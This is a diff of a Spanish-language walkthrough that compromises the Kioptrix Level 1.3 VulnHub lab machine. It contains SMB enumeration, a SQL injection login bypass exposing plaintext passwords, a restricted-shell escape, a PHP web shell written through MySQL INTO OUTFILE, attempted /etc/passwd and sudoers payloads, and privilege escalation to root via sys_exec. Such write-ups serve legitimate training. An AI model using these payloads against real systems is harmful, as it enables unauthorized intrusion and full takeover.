@@ -1,21 +1,47 @@
-Esta máquina solo tenia un archivo `.vmdk`, lo que se tuvo que hacer, fue crear una nueva máquina virtual desde cero con Ubuntu-64bits y reemplazar el archivo `.vmdk` creado, por el descargado.
-En las configuraciones lo dejamos en modo breach para obtener una IP.
+# Kioptrix: Level 1.3 (#4) (VulnHub - Easy) WriteUp Español
 
-Tiramos un escaneo usando el nombre de la interfaz de la máquina atacante:
+[🦔](#PreRequerimientos) #PreRequerimientos
 
+[🦔](#Reconocimiento) #Reconocimiento
+- Escaneo usual (IP, TTL, Puertos, Versiones y Servicios, Launchpad)
+
+[🦔](#VulnGathering) #VulnGathering
+- Análisis de vulnerabilidades SMB con Nmap
+- Análisis web + descubrimiento SQLi
+
+[🦔](#Engaño) #Engaño
+- Perfilación SQLi + obtención de contraseñas en texto plano
+
+[🦔](#Explotación) #Explotación
+- Conexión SSH + bypass shell restringida
+
+[🦔](#GanarControl) #GanarControl
+- Obtención de credenciales MySQL
+- Creación de archivos como root por inyección `INTO OUTFILE`
+- Ejecución de comandos por `select sys_exec();`
+
+[🦔](#Resultados-PoC) #Resultados-PoC
+
+
+_Presiona al erizo para dirigirte al contenido._
+#### PreRequerimientos
+Esta máquina solo tenia un archivo `.vmdk`, por lo tanto, se creo una nueva máquina virtual desde cero con Ubuntu-64bits y reemplazó el archivo `.vmdk` creado, por el que ya estaba descargado.
+En las configuraciones lo dejamos en modo bridged para obtener una IP.
+#### Reconocimiento
+Se tira un escaneo usando el nombre de la interfaz de la máquina atacante:
 ```js
 $sudo arp-scan -I wlp2s0 --localnet
 [...]
 192.168.0.69	00:0c:29:49:7d:d8	VMware, Inc.
 ```
 
-Hacemos un ping, para un primer reconocimiento:
+Se hace un ping, para un primer reconocimiento:
 ```js
 $ping -c 1 192.168.0.69
 PING 192.168.0.69 (192.168.0.69) 56(84) bytes of data.
 64 bytes from 192.168.0.69: icmp_seq=1 ttl=64 time=10.1 ms
 ```
-Dado el TTL sabemos que es un sistema linux, realizamos un escaneo para ver los puertos disponibles de la máquina víctima:
+Dado el TTL se sabe que es un sistema linux, por lo que se realiza un escaneo para ver los puertos disponibles de la máquina víctima:
 ```js
 $sudo nmap -p- -Pn -n -T3 192.168.0.69
 [...]
@@ -28,9 +54,9 @@ PORT    STATE SERVICE
 139/tcp open  netbios-ssn
 445/tcp open  microsoft-ds
 ```
-Obtenemos de información que hay 39528 cerrados, 26003 filtrados, 4 abiertos, da un total de 65535 puertos, es decir contemplamos todos.
+Se obtiene el estado de el total de puertos: 39528 cerrados, 26003 filtrados, 4 abiertos, da un total de 65535 puertos, es decir se contemplan todos.
 
-Para obtenrmás información delos puertos abiertos, hacemos un segundo escaneo con nmap.
+Para obtener más información de los puertos abiertos, hacemos un segundo escaneo con nmap.
 ```js
 $sudo nmap -p22,80,139,445 -sSCV -Pn -n 192.168.0.69
 [...]
@@ -64,8 +90,8 @@ Host script results:
 |_nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
 ```
 
-Al parecer podemos comenzar con el servidor Samba 3.0.28asmb.
-Verificando la vulnerabilidad:
+#### VulnGathering
+Dado el resultado anterior, se procedió a indagar en las vulnerabilidades del servidor Samba 3.0.28asmb. 
 ```js
 $nmap --script vuln -p 445 192.168.0.69
 [...]
@@ -78,9 +104,9 @@ Host script results:
 |_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)
 |_smb-vuln-ms10-054: false
 ```
+No aparecieron vulnerabilidades específicas, pero es casi seguro que existen
 
-Como en este caso no aparecieron vulnerabilidades específicas, pero es casi seguro que existen, seremos más incisivos en este puerto. El primer escaneo de puertos lanzó el script: `smb-os-discovery` y `smb-security-mode`
-
+Se realizaron análisis más incisivos en este puerto. Al ver que el primer escaneo de puertos lanzó el script: `smb-os-discovery` y `smb-security-mode`, se buscó que otras opciones de scripts pueden ser usados. Donde se destacaron varios scripts de enumeración:
 ```js
 $ls /usr/share/nmap/scripts | grep smb
 []..
@@ -92,7 +118,7 @@ smb-enum-sessions.nse
 smb-enum-shares.nse
 smb-enum-users.nse
 ```
-
+Se utilizó `smb-enum-domains` para avanzar en el análisis de vulnerabilidades, dando este resultado:
 ```js
 $nmap --script "smb-enum-domains" -sC 192.168.0.69
 [...]
@@ -111,15 +137,16 @@ Host script results:
 |     Passwords: min length: 5; min age: n/a days; max age: n/a days; history: n/a passwords
 |_    Account lockout disabled
 ```
-
 El script `smb-enum-domains` lista dominios, usuarios y políticas de contraseñas accesibles por SMB en este caso en el puerto 445.
-¿Qué es Builtin? Es un dominio interno  por defeult, donde están los grupos y usarios por defecto de un sistema.
-En este caso no se enumeraron grupos ni usuarios,pero sí dice que su política de contraseñas es de mínimo 5 carácteres y que el bloque tras intentos fallidos está deshabilitado.
-Sabiendo esto, podemos hacer el reconocimiento del dominio KIOPTRIX4, del cual, el comando mostró 5 usuarios.
+
+¿Qué es Builtin? Es un dominio interno  por default, donde están los grupos y usuarios por defecto de un sistema.
+En este caso no se enumeraron grupos ni usuarios, pero sí dice que su política de contraseñas es de mínimo 5 caracteres y que el bloque tras intentos fallidos está deshabilitado.
+
+Sabiendo esto, podemos se hace el reconocimiento del dominio `KIOPTRIX4`, del cual, el comando mostró 5 usuarios.
 Sobre las políticas de contraseñas dice lo mismo que Builtin.
 Agregamos `192.168.0.69    KIOPTRIX4` como linea al archivo `/etc/hosts`
 
-Siguiendo con el reconocimiento, buscaremos enumerar los recursos compartidos por smb:
+Siguiendo con el reconocimiento, buscaremos enumerar los recursos compartidos por SMB:
 ```js
 $nmap -p445 --script "smb-enum-shares" -sC 192.168.0.69
 [...]
@@ -148,12 +175,13 @@ Host script results:
 |_    Current user access: <none>
 ```
 
-El script `smb-enum-shares` enumera los recursos compartidos como habíamos dicho, pero usa la cuenta que tenemos `guest`, es decir, simulamos un acceso anónimo.
-Podemos ver algo inusual; IPC$ normalmente no comparte archivos, se usa para la comunicación de procesos, pero el `READ/WRITE` indica acceso (como si se utilizara para archivos). Cosa que no pasa con print$.
+El script `smb-enum-shares` enumera recursos compartidos como habíamos dicho, pero usa la cuenta que tenemos `guest`, es decir, simulamos un acceso anónimo.
 
-Con esta carpeta mal configurada, tenemos un posible vector de ataque.
-Sigamos con el reconocimiento,hay un puerto 80 esperando...
+Se logró ver algo inusual; `IPC$` normalmente no comparte archivos, se usa para la comunicación de procesos, pero el `READ/WRITE` indica acceso (como si se utilizara para archivos). Cosa que no pasa con `print$`.
 
+Con esta carpeta mal configurada, se obtuvo un posible vector de ataque.
+
+Se procedió con el reconocimiento ya que hay un puerto 80 esperando...
 En un primer reconocimiento, podemos intuir que se trata de un login:
 ```python
 $whatweb http://192.168.0.69
@@ -171,9 +199,9 @@ to fix the issue.<br>
 <input type=submit value="Back"></form>
 ```
 
-Con esta respuesta, vemos que quieren saltar el cracter comilla `'`, y que el caracter octothorpe no se considera. es decir que si baipaseamos la escapada de la comilla, podemos obtener algo.
-
-Con las pruebas vemos que la escapada aplica al nombre de usuario, si usamos robert con `1' or '1'='1` y obtenemos esto:
+Con esta respuesta, notamos una escapada del caracter comilla `\'`, y que el caracter octothorpe no se considera, es decir, al lograr baipasear la escapada de la comilla, podemos obtener un ataque.
+#### Engaño
+Con las pruebas se observo que la escapada aplica al nombre de usuario solamente, se probó con los usuarios obtenidos en samba y con el usuario robert y la contraseña `1' or '1'='1`, se obtuvo esto:
 ```html
 <tr><td width="30">Username</td>
 	<td width="464">robert</td>
@@ -184,7 +212,7 @@ Con las pruebas vemos que la escapada aplica al nombre de usuario, si usamos rob
 </tr>
 ```
 
-También con el usuario `john`, obtuvimos tambien su contraseña:
+Tienpo después se logró obtener también la contraseña del usuario `john`:
 ```html
 <tr><td width="30">Username</td>
 	<td width="464">john</td>
@@ -195,7 +223,8 @@ También con el usuario `john`, obtuvimos tambien su contraseña:
 </tr>
 ```
 
-Con esta contraseña, que no esta cifrada aunque lo parezca tenemos acceso, pero limitado:
+#### Explotación
+Con esta contraseña, que no esta cifrada aunque lo parezca se obtuvo acceso, pero limitado:
 ```python
 $ssh robert@192.168.0.69
 [...]
@@ -208,9 +237,7 @@ robert:~$ ?
 cd  clear  echo  exit  help  ll  lpath  ls
 ```
 
-find / -type d -perm /u=w,g=w,o=w 2>/dev/null
-
-Con este usuario `robert` no obtuvimos nada con la shel restringida, pero es muy sencillo baipasearla.
+Con el usuario `robert` no se obtuvo nada con la shell restringida, pero es muy sencillo baipasearla.
 ```python
 robert:~$ $(echo "cd /tmp")
 robert:~$ echo !$
@@ -223,7 +250,8 @@ robert:~$ echo os.system('/bin/bash')
 robert@Kioptrix4:~$
 ```
 
-Buscamos directorios donde el usuario `robert` pueda escribir:
+#### GanarControl
+Se buscaron directorios donde el usuario `robert` pueda escribir, dando como resultado, algunos donde se pueda obtener más información para el compromiso.
 ```python
 robert@Kioptrix4:~$ find / -type d -perm /u=w,g=w,o=w 2>/dev/null
 [...]
@@ -276,10 +304,8 @@ drwxr-xr-x 2 root root 4096 Feb  4  2012 john
 -rw-r--r-- 1 root root  606 Feb  6  2012 member.php
 drwxr-xr-x 2 root root 4096 Feb  4  2012 robert
 ```
-
-
-
-```
+Se revisó el archivo `database.sql` y se obtuvieron al final credenciales para la base de datos.
+```sql
 robert@Kioptrix4:/var/www$ cat database.sql 
 CREATE TABLE `members` (
 `id` int(4) NOT NULL auto_increment,
@@ -293,11 +319,9 @@ PRIMARY KEY (`id`)
 -- 
 
 INSERT INTO `members` VALUES (1, 'john', '1234');
-
 ```
-
-
-```
+De igual forma, para un mayor privilegio se logró acceder como root a la base de datos:
+```sql
 robert@Kioptrix4:/var/www$ mysql -u root
 Welcome to the MySQL monitor.  Commands end with ; or \g.
 Your MySQL connection id is 64
@@ -315,18 +339,11 @@ mysql> show databases;
 +--------------------+
 3 rows in set (0.00 sec)
 ```
-
-Usando igual root, hacemos un tipo de inyección, con select ... into outfile
-```
+Usando igual root, se hizo un tipo de inyección, con select ... into outfile
+```python
 robert@Kioptrix4:/var/www$ mysql -u root        
-Welcome to the MySQL monitor.  Commands end with ; or \g.
-Your MySQL connection id is 66
-Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)
+Welcome to the MySQL monitor.[...]
 
-Type 'help;' or '\h' for help. Type '\c' to clear the buffer.
-
-mysql> SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/checklogin.php';
-ERROR 1086 (HY000): File '/var/www/checklogin.php' already exists
 mysql> SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/shell.php';     
 Query OK, 1 row affected (0.00 sec)
 
@@ -335,33 +352,31 @@ Bye
 robert@Kioptrix4:/var/www$ ls
 checklogin.php  database.sql  images  index.php  john  login_success.php  logout.php  member.php  robert  shell.php
 ```
-
-```
+Se valido la webshell de la siguiente forma:
+```python
 http://192.168.0.69/shell.php?cmd=whoami
 ```
-
-```
+Con la webshell obtenida no se obtuvieron resultados, procedemos a crear un usuario con privilegios
+```python
 $openssl passwd -1 -salt alexi alexi
 $1$alexi$eGNWFfBkUjcEpDg87R5OV1
 ```
-
-```
-alexi:$1$alexi$eGNWFfBkUjcEpDg87R5OV1:0:0:root:/root:/bin/bash
-
-
+Se construyó el payload formando la línea: `alexi:$1$alexi$eGNWFfBkUjcEpDg87R5OV1:0:0:root:/root:/bin/bash`, obteniendo el payload:
+```sql
 SELECT "alexi:$1$alexi$eGNWFfBkUjcEpDg87R5OV1:0:0:root:/root:/bin/bash" INTO OUTFILE '/etc/passwd';
-
-
-
+```
+Sin embargo, no procedió, porque el archivo ya existía. Creamos otro payload:
+```sql
 SELECT "robert ALL=(ALL) NOPASSWD:ALL" INTO OUTFILE "/etc/sudoers.d/robert";
-
-echo "robert ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/robert
-
-
-
+```
+Pero, sucedió el mismo error:
+```sql
 mysql> SELECT "robert ALL=(ALL) NOPASSWD:ALL" INTO OUTFILE "/etc/sudoers.d/robert";
 ERROR 1 (HY000): Can't create/write to file '/etc/sudoers.d/robert' (Errcode: 2)
+```
 
+Cambiando el enfoque del ataque, se logró ver que se puede realizar ejecución de la siguiente forma:
+```sql
 mysql> select sys_exec('usermod -aG admin robert');
 +--------------------------------------+
 | sys_exec('usermod -aG admin robert') |
@@ -372,16 +387,12 @@ mysql> select sys_exec('usermod -aG admin robert');
 
 mysql> exit
 Bye
+```
+#### Resultados-PoC
+Validamos el resultado de la siguiente forma:
+```js
 robert@Kioptrix4:/var/www$ sudo su
 [sudo] password for robert: 
 root@Kioptrix4:/var/www# id
 uid=0(root) gid=0(root) groups=0(root)
-
-
-
-
-
 ```
-
-
-
